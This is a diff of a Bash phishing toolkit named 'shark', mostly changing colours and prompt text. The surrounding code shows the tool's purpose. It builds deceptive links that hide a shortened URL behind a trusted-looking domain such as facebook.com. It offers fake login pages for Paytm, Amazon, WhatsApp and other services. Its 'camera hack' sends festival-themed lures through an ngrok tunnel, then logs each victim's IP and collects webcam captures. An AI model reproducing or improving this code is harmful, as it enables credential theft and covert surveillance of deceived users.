@@ -84,7 +84,7 @@ function os () {
                 BIN="/usr/bin"
 	        phish="/usr/share/shark/phs"
 		user_id="$(logname)"
-		if [ "$logname" = "root" ]; then 
+		if [ "${user_id}" = "root" ]; then 
 		         files="/root/Desktop"
 	        else
 		         files="/home/${user_id}/Desktop"
@@ -296,14 +296,15 @@ function url_shortner() {
 	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
         short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
         shorter=${short#https://}       
-        read -p $'\n\033[1;94mshark \033[1;97m>> \033[1;92mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
+        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask	
-	printf "${blue}shark ${white}>> ${green}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
-	printf "${blue}shark ${white}>> ${green}Don't use space in your words\n"	
-        read -p $'\e[1;94mshark \033[1;97m>> \e[1;92mEnter your words here :\e[0m ' words
+	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
+	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"	
+        read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
         final_url=$mask-$words@$shorter
 	printf "$final_url\n"
 }
+
 
 # MAIN 
 function main() {
@@ -336,9 +337,9 @@ function credentials() {
 
 #Paytm
 function paytm() {
-          printf "\n${red}[${white} 1 ${red}]${green} Sign In \n\n" 
-          printf "${red}[${white} 2 ${red}]${green} Sign Up \n\n"                           
-          read -p $'\e[1;31m>>>\e[1;92m Enter Your Choice : \e[0m' option1			  
+          printf "\n${green}[${white}1${green}]${white} Sign In \n\n" 
+          printf "${green}[${white}2${green}]${white} Sign Up \n\n"                           
+          read -p $'\e[1;92mshark \e[1;37m>> Enter Your Choice : \e[0m' option1			  
           if [ $option1 = 1 ] || [ $option1 = 01 ]; then	           
 		   cd paytm/ && main
 		   credentials
@@ -352,10 +353,10 @@ function paytm() {
 
 #CAMERA HACK
 function camera_hack() {	
-        clear && printf "\n\n"
-        printf "$green >>> ${white}Choose Your Tempelates\n\n"
-        printf "$yellow [ 1 ] ${white}Diwali \n\n";printf "$yellow [ 2 ] ${white}Freindship Dare \n\n";printf "$yellow [ 3 ] ${white}Freindship Day \n\n";printf "$yellow [ 4 ] ${white}New Year \n\n";printf "$yellow [ 5 ] ${white}Jio Offfer \n\n"
-        read -p $'\e[1;92m >>> \e[0m Enter Your Choice : \n\n' page
+        clear
+        printf "\n\e[1;4;92mChoose Your Tempelates\e[0m\n\n"
+        printf "${green}[${white}1${green}]${white} Diwali \n\n";printf "${green}[${white}2${green}]${white} Freindship Dare \n\n";printf "${green}[${white}3${green}]${white} Freindship Day \n\n";printf "${green}[${white}4${green}]${white} New Year \n\n";printf "${green}[${white}5${green}]${white} Jio Offfer \n\n"
+        read -p $'\e[1;92mshark\e[1;37m >>\e[0m ' page
         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
         case $page in
 
@@ -385,12 +386,12 @@ function camera_hack() {
 		credentials
 		while [ true ]; do			
                         if [[ -e "ip.txt" ]]; then				
-			        printf "\n${green}[${white}+${green}] Victim opened the link!\n"
+			        printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
 			        catch_ip && rm -rf ip.txt
 			fi			 
 			sleep 0.5
 		        if [[ -e "Log.log" ]]; then				
-			        printf "\n${green}[${white}+${green}] Cam file received!\n\n" && rm -rf Log.log
+			        printf "\n${green}[${white}+${green}] Cam file received!\n" && rm -rf Log.log
 			fi
 			sleep 0.5
 			mv cam* ${files}/Camera_hack >> /dev/null 2>&1 
@@ -428,7 +429,7 @@ do
 
         ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
        ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
-       ╚█████╗ ███████║███████║██████╔╝█████═╝
+       ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
         ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
        ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v ${VERSION}\n\n "
@@ -451,7 +452,7 @@ banner(){
         printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
-        read -p $'\e[1;34mshark \e[1;97m>>\e[0m ' option
+        read -p $'\e[1;92mshark \e[1;97m>>\e[0m ' option
 }
 
 
